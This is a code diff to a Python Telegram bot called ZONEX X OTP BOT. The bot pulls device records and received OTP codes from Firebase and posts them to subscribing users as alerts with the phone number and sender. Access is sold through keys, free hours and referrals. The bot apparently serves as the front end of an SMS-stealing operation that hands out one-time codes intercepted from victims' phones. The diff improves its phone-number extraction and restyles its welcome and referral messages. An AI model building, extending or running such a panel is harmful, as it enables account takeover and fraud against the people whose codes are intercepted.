@@ -2,7 +2,7 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v5.1              ║
+║        ZONEX X OTP BOT v5.2              ║
 ║  High Level UI · Channel Gate · Admin    ║
 ╚══════════════════════════════════════════╝
 """
@@ -208,40 +208,6 @@ async def _sync_from_firebase_on_startup():
 # ─── Helper functions ─────────────────────────────────────────────────────────
 def get_referral_hours() -> float:
     return float(data.get("referral_hours", 1))
-
-def get_best_phone(info: dict) -> str:
-    """Firebase JSON se best possible phone number nikalta hai."""
-    if not isinstance(info, dict): return "—"
-    
-    # 1. Direct fields check
-    keys = ["mobNo", "phoneNumber", "phone", "mobile", "Mobile", 
-            "phone_number", "PhoneNumber", "phoneNo", "mob_no", "contact", "number"]
-    for k in keys:
-        v = info.get(k)
-        if v:
-            s = str(v).strip()
-            if s and s not in ("None", "none", "", "—", "-", "Unknown", "unknown", "null"):
-                return s
-                
-    # 2. Sims nested fields check
-    sims = info.get("sims") or {}
-    sl = sims if isinstance(sims, list) else list(sims.values())
-    for sim in sl:
-        if isinstance(sim, dict):
-            for k in ["phoneNumber", "phone", "number", "mobNo"]:
-                v = sim.get(k)
-                if v:
-                    s = str(v).strip()
-                    if s and s not in ("None", "none", "", "—", "-", "Unknown", "unknown", "null"):
-                        return s
-                        
-    # 3. Deep Search (Fallback)
-    for k, v in info.items():
-        if isinstance(v, str) and ("phone" in k.lower() or "mob" in k.lower() or "number" in k.lower()):
-            if len(re.sub(r"\D", "", v)) >= 10:
-                return v
-                
-    return "—"
 
 # ─── Cache ────────────────────────────────────────────────────────────────────
 device_cache: dict   = {}
@@ -482,6 +448,75 @@ async def fetch_otps(url: str, key: str, dev_id: str):
             })
     return otps, last_any_dt
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ★ PHONE RESOLVER — tries every possible key so number ALWAYS shows ★
+# ══════════════════════════════════════════════════════════════════════════════
+def resolve_phone(info: dict, dev_id: str = "") -> str:
+    """Try every known phone field; return best found or '—'."""
+    if not isinstance(info, dict):
+        return "—"
+
+    BAD = {"", "none", "null", "—", "-", "–", "unknown", "n/a", "na",
+           "undefined", "invalid", "no number", "not available", "unavailable"}
+
+    def _clean(v):
+        if v is None:
+            return ""
+        s = str(v).strip()
+        if s.lower() in BAD:
+            return ""
+        # ignore pure numeric device IDs that are too long (probably not phone)
+        return s
+
+    # 1. direct phone-ish fields
+    candidates = [
+        info.get("mobNo"),
+        info.get("phoneNumber"),
+        info.get("phone_number"),
+        info.get("PhoneNumber"),
+        info.get("phone"),
+        info.get("mobile"),
+        info.get("Mobile"),
+        info.get("mob"),
+        info.get("number"),
+        info.get("Number"),
+        info.get("msisdn"),
+        info.get("simNumber"),
+        info.get("sim_number"),
+        info.get("contact"),
+    ]
+
+    # 2. sims array (list or dict)
+    sims = info.get("sims") or info.get("SIMs") or info.get("sim") or {}
+    if isinstance(sims, dict):
+        sims = list(sims.values())
+    if isinstance(sims, list):
+        for s in sims:
+            if not isinstance(s, dict):
+                continue
+            for k in ("phoneNumber", "phone", "number", "mobNo",
+                      "mobile", "msisdn", "simNumber", "Number"):
+                candidates.append(s.get(k))
+
+    # 3. nested "device" / "info" / "data" objects
+    for nest_key in ("device", "info", "data", "details", "meta"):
+        nest = info.get(nest_key)
+        if isinstance(nest, dict):
+            for k in ("phone", "phoneNumber", "mobNo", "mobile", "number"):
+                candidates.append(nest.get(k))
+
+    for c in candidates:
+        s = _clean(c)
+        if s:
+            return _normalize_phone(s)
+
+    # 4. last resort — if dev_id itself looks like a phone number
+    if dev_id and dev_id.isdigit() and 10 <= len(dev_id) <= 13:
+        return _normalize_phone(dev_id)
+
+    return "—"
+
+
 async def refresh_firebase(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
     clients = await fb_get(url, "clients", key)
@@ -493,9 +528,7 @@ async def refresh_firebase(cfg: dict):
     valid = []
     for dev_id, info in clients.items():
         if not isinstance(info, dict): continue
-        
-        # PHONE NUMBER FIX
-        phone = get_best_phone(info)
+        phone = resolve_phone(info, dev_id)
         valid.append((dev_id, info, phone))
 
     async def _fetch_one(dev_id):
@@ -544,10 +577,7 @@ async def refresh_clients_only(cfg: dict):
     for dev_id, info in clients.items():
         if not isinstance(info, dict):
             continue
-            
-        # PHONE NUMBER FIX
-        phone = get_best_phone(info)
-        
+        phone = resolve_phone(info, dev_id)
         fb_status = bool(info.get("status") or info.get("isOnline") or
                          info.get("is_online") or info.get("online"))
         is_online = fb_status  
@@ -590,7 +620,6 @@ async def refresh_all():
 # ─── Stats ────────────────────────────────────────────────────────────────────
 def _normalize_phone(ph: str) -> str:
     ph = str(ph).strip()
-    if ph == "—": return ph
     digits = re.sub(r"[\s\-\.\(\)]", "", ph)
     pure = digits.lstrip("+")
     if not pure.isdigit():
@@ -602,6 +631,26 @@ def _normalize_phone(ph: str) -> str:
     if digits.startswith("+"):
         return digits
     return f"+{pure}"
+
+def _has_valid_phone(info: dict) -> bool:
+    ph = str(info.get("phone", "")).strip()
+    if not ph:
+        return False
+    low = ph.lower()
+    bad_words = {"unknown", "none", "null", "n/a", "na", "no number",
+                 "not available", "unavailable", "undefined", "invalid"}
+    if low in bad_words or low in ("—", "-", "–"):
+        return False
+    if low.endswith("new"):
+        return False
+    if " " in ph:
+        return False
+    stripped = ph.lstrip("+")
+    if not stripped.isdigit():
+        return False
+    if len(stripped) < 6:
+        return False
+    return True
 
 def count_online() -> int:
     return sum(1 for dm in device_cache.values()
@@ -649,10 +698,13 @@ def txt_welcome_panel(name: str, uid: int) -> str:
         f"🔄 Auto Refresh › {AUTO_REFRESH}s"
     )
 
+def _val(v: str) -> bool:
+    return bool(v) and v not in ("—", "-", "–", "None", "none", "null", "")
+
 def txt_device_card(label: str, dev_id: str) -> str:
     info  = device_cache.get(label, {}).get(dev_id, {})
     otps  = otp_cache.get(label, {}).get(dev_id, [])
-    phone = _normalize_phone(info.get('phone','—'))
+    phone = info.get('phone') or "—"
     battery   = str(info.get('battery','—'))
     android   = str(info.get('android','—'))
     network   = str(info.get('network','—'))
@@ -689,12 +741,13 @@ def txt_device_card(label: str, dev_id: str) -> str:
     return "".join(lines)
 
 def txt_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
+    phone = info.get('phone') or "—"
     return (
         f"⚡ <b>OTP ALERT</b> ⚡\n"
         f"{'━'*30}\n\n"
         f"🔢  <b><code>{e['otp']}</code></b>\n\n"
         f"{'━'*30}\n"
-        f"📞 <code>{_normalize_phone(info.get('phone','—'))}</code>\n"
+        f"📞 <code>{phone}</code>\n"
         f"📤 {e['sender']}\n"
         f"🕐 {e['time']}\n"
         f"{'─'*30}\n"
@@ -814,8 +867,8 @@ def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
     for i in range(0, len(chunk), 2):
         row = []
         for lb, did, info in chunk[i:i+2]:
-            ph   = _normalize_phone(info.get("phone","—"))
-            ph_short = ph[-10:] if ph != "—" else "—"
+            ph = info.get("phone") or "—"
+            ph_short = ph if ph != "—" else f"ID:{did[-6:]}"
             esc  = lb.replace(":","_")
             row.append(InlineKeyboardButton(f"🟢 {ph_short}",
                                             callback_data=f"dev:{esc}:{did}:{page}"))
@@ -1013,14 +1066,16 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     all_joined, missing = await check_channels(ctx.bot, uid)
     if not all_joined:
+        # ★ PATCHED: Text first, channel buttons below
         await update.message.reply_text(
-            f"┌───────────────────────┐\n"
-            f"│  🤖 <b>ZONEX X OTP BOT</b>  │\n"
-            f"└───────────────────────┘\n\n"
+            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+            f"🤖  <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
+            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
             f"👋 Welcome <b>{name}</b>!\n\n"
-            f"🔒 <b>BOT ACCESS REQUIRED</b>\n\n"
+            f"🔒 <b>𝐁𝐎𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃</b>\n\n"
             f"Bot use karne ke liye pehle\n"
-            f"yeh channels join karo 👇",
+            f"yeh channels join karo 👇\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━",
             parse_mode="HTML",
             reply_markup=kb_channels(missing)
         )
@@ -1041,25 +1096,31 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 data["users"][str(ref_uid)].get("referral_count", 0) + 1
             save_data(data)
             try:
+                # ★ PATCHED: Styled referral bonus card
                 await ctx.bot.send_message(
                     ref_uid,
-                    f"🎉 <b>Referral Bonus!</b>\n\n"
-                    f"Tumhare referral <b>{name}</b> ne join kar liya!\n"
-                    f"⏱ <b>+{rh:.0f} Hour</b> add hua tumhare account mein!",
+                    f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+                    f"🎉  <b>𝐑𝐄𝐅𝐄𝐑𝐑𝐀𝐋 𝐁𝐎𝐍𝐔𝐒</b>\n"
+                    f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+                    f"✅ Referral Joined Successfully!\n"
+                    f"⏱️ Bonus Added › +{int(rh)} hour\n\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"🎁 <b>𝐅𝐑𝐄𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!</b>\n"
+                    f"⚡ +{int(rh)} hour Added to Your Account",
                     parse_mode="HTML"
                 )
             except: pass
 
-        # High Level Welcome Message
+        # ★ PATCHED: Styled welcome card
         await update.message.reply_text(
-            f"┌────────────────────────┐\n"
-            f"│  🎉 <b>WELCOME TO ZONEX OTP!</b>  │\n"
-            f"└────────────────────────┘\n\n"
+            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+            f"🎉  <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏!</b>\n"
+            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
             f"🎁 <b>{WELCOME_HOURS} HOUR FREE ACCESS!</b>\n\n"
-            f"──────────────────────────\n"
-            f"🗝 <b>YOUR PERMANENT KEY:</b>\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🗝 <b>𝐘𝐎𝐔𝐑 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓 𝐊𝐄𝐘:</b>\n\n"
             f"<code>{key}</code>\n\n"
-            f"──────────────────────────\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"👇 Copy Key & Send It Here\n"
             f"⚡ Panel Opens Instantly!",
             parse_mode="HTML"
@@ -1196,14 +1257,14 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             save_data(data)
             key = get_key(uid)
             await q.edit_message_text(
-                f"┌────────────────────────┐\n"
-                f"│  🎉 <b>WELCOME TO ZONEX OTP!</b>  │\n"
-                f"└────────────────────────┘\n\n"
+                f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+                f"🎉  <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏!</b>\n"
+                f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
                 f"🎁 <b>{WELCOME_HOURS} HOUR FREE ACCESS!</b>\n\n"
-                f"──────────────────────────\n"
-                f"🗝 <b>YOUR PERMANENT KEY:</b>\n\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🗝 <b>𝐘𝐎𝐔𝐑 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓 𝐊𝐄𝐘:</b>\n\n"
                 f"<code>{key}</code>\n\n"
-                f"──────────────────────────\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"👇 Copy Key & Send It Here\n"
                 f"⚡ Panel Opens Instantly!",
                 parse_mode="HTML"
@@ -1217,11 +1278,17 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                     data["users"][str(ref_uid)].get("referral_count", 0) + 1
                 save_data(data)
                 try:
+                    # ★ PATCHED: Styled referral bonus card
                     await ctx.bot.send_message(
                         ref_uid,
-                        f"🎉 <b>Referral Bonus!</b>\n\n"
-                        f"Tumhara referral join ho gaya!\n"
-                        f"⏱ <b>+{rh:.0f} Hour</b> add hua!",
+                        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+                        f"🎉  <b>𝐑𝐄𝐅𝐄𝐑𝐑𝐀𝐋 𝐁𝐎𝐍𝐔𝐒</b>\n"
+                        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+                        f"✅ Referral Joined Successfully!\n"
+                        f"⏱️ Bonus Added › +{int(rh)} hour\n\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        f"🎁 <b>𝐅𝐑𝐄𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!</b>\n"
+                        f"⚡ +{int(rh)} hour Added to Your Account",
                         parse_mode="HTML"
                     )
                 except: pass
@@ -1300,7 +1367,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 "<i>Devices aate hi yahan dikh jaayengi.</i>",
                 reply_markup=kb_back(), parse_mode="HTML"); return
         
-        # High Level ERA Style Online Panel
         await q.edit_message_text(
             f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
             f"   📱 <b>𝐎𝐍𝐋𝐈𝐍𝐄 𝐃𝐄𝐕𝐈𝐂𝐄𝐒</b>\n"
@@ -2553,7 +2619,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v5.1 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v5.2 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
